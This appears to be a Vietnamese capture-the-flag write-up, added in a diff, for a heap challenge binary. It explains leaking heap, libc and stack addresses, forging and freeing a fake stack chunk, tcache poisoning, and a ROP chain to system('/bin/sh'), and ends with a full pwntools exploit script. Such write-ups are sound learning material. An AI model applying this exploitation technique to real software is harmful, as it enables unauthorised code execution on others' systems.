@@ -137,4 +137,206 @@ LABEL_2:
   }
 }
 ```
-# Ph
+# Chuẩn bị
+```python
+def create(size, content):
+        sla(b'> ', '1')
+        sla(b': ', str(size).encode())
+        sa(b': ', content)
+def remove(idx):
+        sla(b'> ', '2')
+        sla(b': ', str(idx).encode())
+def write(payload):
+        sla(b'> ', '3')
+        sa(b'fun\n', payload)
+def gift():
+        sla(b'> ', '4')
+        p.recvuntil(b't: \n')
+        return int(p.recvline(keepends = False).decode())
+```
+# Phân tích 
+- Đầu tiên option 1 không giới hạn size, ta có thể leak libc bằng unsorted bin
+- Thứ 2 option 2 không kiểm tra idx, có nằm trong khoảng 0 đến <= 7 (có thể free các địa chỉ khác)
+- Thứ 3 option 3 cho phép ta viết vào vùng nhớ stack ở ngay dưới mảng lưu các địa chỉ heap
+- Thứ 4 là leak stack
+> từ 2 3 4 ta có thể tận dụng option 3 để fake chunk và 1 địa chỉ trỏ vào fake chunk, sau đó vì option 2 không kiểm tra idx nên ta có thể free địa chỉ trỏ đến fake chunk đó
+![Alt text](image.png)
+# Khai thác
+## Leak heap (có thể không cần thiết)
+- Để leak được heap đầu tiên ta sẽ malloc mà size là 0 để chương trình làm tròn là 0x20. Sau đó free chunk đó đi và malloc size 0 lại lần nữa
+> Mục đích size 0 là để khi read thì chúng ta không phải nhập gì tránh ghi đè
+```python
+create(8, b'a') # 0
+remove(0)
+create(8, b'0') # 0
+p.recvuntil(b'tent: \n')
+heap = u64(p.recvline(keepends = False).ljust(8, b'\0')) <<12
+print(hex(heap))
+```
+
+## Leak libc
+- Leak libc bằng unsorted bin, khi chunk trong unsorted sẽ chứa 2 địa chỉ libc, ta sẽ ghi đè địa chỉ thứ nhất đế tận dụng %s địa chỉ thứ 2
+```python
+create(0x500, b'a\n') # 1
+create(0x50, b'a') # 2
+remove(1)
+create(0x500, b'a'*8) #1, count = 2
+p.recvuntil(b'a' *8)
+libc.address = u64(p.recvline(keepends = False).ljust(8, b'\0')) - 0x219ce0
+info("libc address: " + hex(libc.address))
+```
+## Leak stack
+
+```python
+create(0x50, b'a\n') # 3
+create(0x50, b'a\n') # 4
+create(0x50, b'a\n') # 5
+create(0x50, b'a\n') # 5
+stack = gift()  
+info("Stack: " + hex(stack))
+```
+
+## Fake chunk
+```python
+payload = flat(
+        stack+0xa0,
+        0, 0x60,
+        0, 0,
+        0, 0,
+        0, 0,
+        0, 0,
+)
+write(payload)
+```
+## Free fake chunk
+- Mục đích free 2 chunk 5 6 để tăng biến count trong tcache, khi unlink ta còn lượt count để malloc
+```python
+remove(5)
+remove(6)
+remove(17)
+```
+## UAF
+```python
+payload = flat(
+        (stack+0xa0),
+        0, 0x60,
+        (stack + 0x100) ^ (stack + 0xa0) >> 12, 0, # ret main ^ fake chunk >> 12
+        0, 0,
+        0, 0,
+        0, 0,
+)
+write(payload)
+```
+## ROP
+- Ta có option 5 để kết thúc chương trình nên mình chọn nó để ROP
+```python
+create(0x50, b'a')
+rop = ROP(libc)
+payload = flat(
+        stack, 
+        rop.find_gadget(['ret']).address,
+        rop.find_gadget(['pop rdi', 'ret']).address, next(libc.search(b'/bin/sh')),
+        libc.sym.system
+)
+create(0x50, payload)
+```
+
+## script
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+exe = ELF('example_hos_fastbin', checksec=False)
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+context.binary = exe
+
+def GDB():
+        if not args.REMOTE:
+                gdb.attach(p, gdbscript='''
+
+                b*main+628
+                c
+                ''')
+                input()
+
+info = lambda msg: log.info(msg)
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+if args.REMOTE:
+        p = remote('')
+else:
+        p = process(exe.path)
+
+GDB()
+def create(size, content):
+        sla(b'> ', '1')
+        sla(b': ', str(size).encode())
+        sa(b': ', content)
+def remove(idx):
+        sla(b'> ', '2')
+        sla(b': ', str(idx).encode())
+def write(payload):
+        sla(b'> ', '3')
+        sa(b'fun\n', payload)
+def gift():
+        sla(b'> ', '4')
+        p.recvuntil(b't: \n')
+        return int(p.recvline(keepends = False).decode())
+create(8, b'a') # 0
+remove(0)
+create(8, b'0') # 0
+p.recvuntil(b'tent: \n')
+heap = u64(p.recvline(keepends = False).ljust(8, b'\0')) <<12
+print(hex(heap))
+
+create(0x500, b'a\n') # 1
+create(0x50, b'a') # 2
+remove(1)
+create(0x500, b'a'*8) #1, count = 2
+p.recvuntil(b'a' *8)
+libc.address = u64(p.recvline(keepends = False).ljust(8, b'\0')) - 0x219ce0
+info("libc address: " + hex(libc.address))
+
+create(0x50, b'a\n') # 3
+create(0x50, b'a\n') # 4
+create(0x50, b'a\n') # 5
+create(0x50, b'a\n') # 5
+stack = gift()  
+info("Stack: " + hex(stack))
+
+payload = flat(
+        stack+0xa0,
+        0, 0x60,
+        0, 0,
+        0, 0,
+        0, 0,
+        0, 0,
+)
+write(payload)
+remove(5)
+remove(6)
+remove(17)
+payload = flat(
+        (stack+0xa0),
+        0, 0x60,
+        (stack + 0x100) ^ (stack + 0xa0) >> 12, 0,
+        0, 0,
+        0, 0,
+        0, 0,
+)
+write(payload)
+create(0x50, b'a')
+rop = ROP(libc)
+payload = flat(
+        stack, 
+        rop.find_gadget(['ret']).address,
+        rop.find_gadget(['pop rdi', 'ret']).address, next(libc.search(b'/bin/sh')),
+        libc.sym.system
+)
+create(0x50, payload)
+p.interactive()
+```
